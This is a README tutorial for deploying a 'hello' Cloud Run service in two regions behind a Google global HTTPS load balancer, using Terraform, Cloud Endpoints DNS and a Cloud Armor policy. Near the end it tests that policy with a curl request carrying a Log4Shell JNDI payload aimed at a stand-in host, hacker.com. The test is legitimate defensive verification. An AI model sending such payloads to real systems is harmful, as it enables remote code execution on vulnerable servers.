### Deploying a highly available multi-regional Cloud Run service with Global HTTPS load balancing on Google Cloud

_This repository contains sample Terraform code to deploy a very basic "hello" application to Google Cloud run as a container, the container image is pre-built and available in Google's public artifact registry, we will just configure our Cloud Run service to use that. The service will be deployed in two Google Cloud regions, us-central1 and us-east1. A Gloabl HTTPS load balancer will "front" the services as a layer-7 proxy._

_The services are configured as "serverless" network endpoint groups behind the load balancer and will be accessible publicly only via the load balancer, even though Google Cloud does yield a "run.app" domain for each Cloud Run service, our "ingress" controls will prevent any direct invocations of the Cloud Run generated domain URL. This will ensure that:_
- _We leverage Google Front End or GFE for global load distribution and locality, let GFE route the incoming request to the nearest backend._
- _This will also improve serving latencies, thus serving the webpage from a Google data center closest to the end user._
- _At the load balancer, we will also configure TLS certifactes and thus load balancer will also act as a point of TLS termination for the end user._
- _Since we will be adding a few security policies (through Google Cloud Armor), routing all the incoming internet traffic through the global load balancer will ensure that thos security policies are applied and any malcious traffic is denied at the edge of the Google network._

_High Level Architecture:_
![cloud-run-simple-ha-gclb](https://user-images.githubusercontent.com/102101947/164895886-d084fd50-d426-4ac8-a0e8-62e275050eab.png)

_Before you begin, please make sure you do the following:_
- _You should have an account, the account should have "owner" role at the project level, it's highly recommended that in your production environments you use the principle of least privileges and thus do not assign overly permissive roles to users/groups, however for the sake of simplicity here, we will use "project owner" role._
- At any point in time, choose security over convinience when dealing with your prod and non-prod environments, the demo does not guide on IAM best practices and thus uses privilged roles like "project owner", this by no means is Google's recommendation, it's okay do use permissive roles in demo/lab environments which will be re-cycled soon after.
- _Once you have the account as stated in step-1, next step is to create a project, you can do that by directly logging into Google Cloud console, if you have "project owner" permissions, you shall be able to create new projects._
- _After you have created the project, make sure it's selected in the "project" drop-down._
- _Click on the "Activate Cloud Shell" icon towards the right corner of you screen and wait for your Cloud Shell instance to load._

![image](https://user-images.githubusercontent.com/102101947/162500749-2bed73b5-61c4-4f5f-b9a8-27358e3896dd.png)

_Please note, that this tutorial uses Cloud Shell for the sake of simplicity, since Cloud Shell comes installed with automation tools like Hashicorp Terraform, Git CLI etc, there is no need to install any of the tools that are used in this demo. If you don't have access to Cloud Shell or Cloud Console, you can install gcloud SDK, terraform and Git CLI on your workstation and perform the steps listed here with few exceptions._

_Once the Cloud Shell instance is ready, first make sure you have the right configurations on the gcloud SDK before you issue any commands._

```
gcloud auth list
```
_Above command, should show the current account you are authenticated with, make sure it's the same account you logged in with and is having "owner" role._

_Next, check the gcloud's current configuration_

```
gcloud config list
```
_Output of this command should show you the current project and other details, project is of prime importance here, we want to make sure that our resources are created in the right project, if you do not see the right project, you can do the following:_

```
gcloud config set project <enter the correct project name>
```
_Google's terraform provider uses application default credentials or ADC for authentication and access controls, to know more about how ADC works you can refer to the link in the appendix but in a nut shell, ADC is an iterative determination of credentials which SDKs or client libraries must use while authenticating against Google Cloud APIs and services. The following gcloud command will update the ADC locally in a file at a known location, ADC will contain credentials, project and billing context for the client libraries to use. Note, that the following command requires that your machine must have an accessible browser, unfortunately Cloud Shell does not, so while you can run this on your workstation with a browser, for Cloud Shell, you may use the second version of this command:_

```
gcloud auth application-default login
```
_Or, since we are running this from Cloud Shell:_

```
gcloud auth login --activate --no-launch-browser --quiet --update-adc
```
_Follow the instructions and the OAuth 2.0 flow, by the end of all the steps, your ADCs will be updated, the project remains set as you observed when running gcloud config list command, if you wish to change, the gcloud config set project command shall help, however make sure if you change the project, the user you authenticated must have sufficient permissions on the project._

_Another alternative is to simply create a separate service account with required permissions and generate a key file, then download the key file locally on your Cloud Shell instance or workstation and set the GOOGLE_APPLICATION_CREDENTIALS environment varible pointing to the absolute path of the key file, Terraform provider should be able to refer to it, you can also configure the location of the file explicitly on the provider. Using key files locally is not always the best practice though and many orgs may just discourage it even disable it through "organization policies", use ADCs as much as possible or consider workload identity federation (not covered here but link in the appendix)._

_Next, clone the repository in your home directory or a another location that you would prefer:_

```
git clone https://github.com/rmishgoog/google-cloud-run-multi-regional.git
```
```
cd google-cloud-run-multi-regional
```
_Since we will be using Google's global HTTP(S) load balancer, we will need an IP address to be assigned to the load balancer's forwarding rule, this IP address will be an external IPV4 IP address. For this tutorial, we will simply use gcloud CLI to reserve ourselves a static IP address which remains consistent and mapped to the DNS even as the other components of the infrastructure are created or destroyed._

```
gcloud compute addresses create cloud-run-lb-external --global
```
_If you get a warning or an error about compute API not enabled, please run the following command:_

```
gcloud services enable compute.googleapis.com
```
_Now, we have an IP, next step is to reserve a domain name for us. No, we don't have use Cloud DNS or another DNS registrar, neither we are going to buy a new domain from elsewhere, Google Cloud's ESP or endpoint service proxies, gives you a free domain for creating API proxies, we will use just that and make our IP address as the target, this will update the A record for the DNS allocated to us, though it takes some time (from 30 minutes to an hour in some cases) for DNS to propagate._

```
export GCLB_IP=$(gcloud compute addresses describe cloud-run-lb-external --global --format=json | jq -r '.address')
```
```
echo ${GCLB_IP}
```
```
export PROJECT=$(gcloud config get-value project)
```
```
gcloud services enable endpoints.googleapis.com
```
```
cat <<EOF > dns-spec.yaml
swagger: "2.0"
info:
  description: "Cloud Endpoints DNS"
  title: "Cloud Endpoints DNS"
  version: "1.0.0"
paths: {}
host: "frontend.endpoints.${PROJECT}.cloud.goog"
x-google-endpoints:
- name: "frontend.endpoints.${PROJECT}.cloud.goog"
  target: "${GCLB_IP}"
EOF
```
```
gcloud endpoints services deploy dns-spec.yaml
```
_At this point, you have successfully reserved an IP address and have associated your Cloud Enpoint domain to it. Next we will get into Terraform provisioning._

_First, create a file terraform.tfvars in the same directory where you cloned the repository, that is google-cloud-run-multi-regional. The content of the file shall look like:_

```
default_region    = "<default region, as set on the profile, gcloud config list will reveal"
project           = "<your project name>"
region_primary    = "<first Cloud Run region where you want to deploy the service>"
region_secondary  = "<second Cloud Run region where you want to deploy the service"
global_ip_address = "<your IP address, that you reserved above>"
cloud_ep_domain   = "<cloud endpoints domain, this should look like frontend.endpoints.<project>.cloud.goog, be sure to replace <project> with your project name"
```
_And that should be it! Now run the Terraform init command, this will init the environment and download the needed provider plugin_

```
terraform init
```
_Generate a plan, here you can see what resources terraform will actually create._

```
terraform plan
```
_If no errors, you shall be good to go and kick off the provisioning by executing terraform apply, if you do not want to be promoted, you can use -auto-approve flag with the terraform apply command, or just respond with yes when prompted._

```
terraform apply -auto-approve
```
_Wait for the terraform provisioning to finish. By the end of terraform execution, you have your multi-regional Cloud Run service behind a global HTTP(S) load balancer, with a domain name assigned and TLS certificates associated. TLS termination will take place at the global load balancer which acts as a proxy to your Cloud Run services. In this example we are in fact using Terraform to provision TLS certificates for the domain we reserved._

_The process of provisioning certificates (we are using Google managed certificates in this example), associating to the domain (after domain is visible) and configuring it on the global load balancer may take some time, in certain cases up to 30-40 minutes, during this time, you will see the status of certificates as "PROVISIONING" before it finally turns to "ACTIVE". So, best thing to do here is to wait, similarly it may take a few minutes for changes to propagate to all the GFEs world-wide and associating the IP to your global load balancing proxy before your webapp becomes available._

_So, just don't panic! Go, get yourself some coffee or take a brisk 10-15 minutes walk, after you are back, try accessing your service at:_

```
https://frontend.endpoints.<your project name>.cloud.goog/
```
_And you shall see the web page:_

![image](https://user-images.githubusercontent.com/102101947/164895542-ddc6ef7b-aeea-4e3a-9517-43ff4187d909.png)

_This is it! But before we wrap up, did we test if our security policies are working to protect our origins from bad actors on the internet? Let's try that too! If you will see the Terraform code, you will notice that we have indeed configured a security policy to deny any malicious request which tries to exploit the recent log4j vulnerability, Google Cloud Armor provides a set of pre-compiled rule sets which can be easily configured to protect your origins by mitigating them at the edge. Let's try this:_

```
curl https://frontend.endpoints.<your project name>.cloud.goog/ -H 'X-Api-Version: ${jndi:ldap://hacker.com/a}'
```
_And the bad actor will be greeted by 403, denied error!_

```
<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>403</title>403 Forbiddenrohitmishra@rmishra-dev:~/terraform-automation$ 
```

_That's it, you can go ahead and run terraform destroy to re-claim the infrastructure you had created for this tutorial._

```
terraform destroy -auto-approve
```

_Remember that you reserved IP address outside of Terraform, so let's delete that, otherwise you will be charged for the IP address which is not associated to any resource._

```
gcloud compute addresses delete cloud-run-lb-external
```
_To summarize, in this tutorial we learned how to quickly deploy serverless containers with Google Cloud Run, configure a global load balancer for load distribution, high availability and resiliency and augment it security policies to mitigate common web threats at the edge._

_Serverless NEGs however do have certain limitations that one must be aware of (such as no health checks) but we can hope that they will be addressed sooner than later, that being said you can still get around such scenarios using Cloud Logging and Monitoring, where you can define metrics based on global load balancer's logs and trigger automation to automatically remove the backend which is not responding or unavailable, adding it manually at a later point in time._

_Thank you for staying with me and I hope you enjoyed this short and simple tutorial._

_P.S. - Opinions, architecture, views etc. shared in this example are of my own. The source code and guidelines are purely for demo/tutorial purposes and not seen as production ready. Google is not liable to provide any support, SLAs or patches for problems faced (if any) while running these examples in your environments._
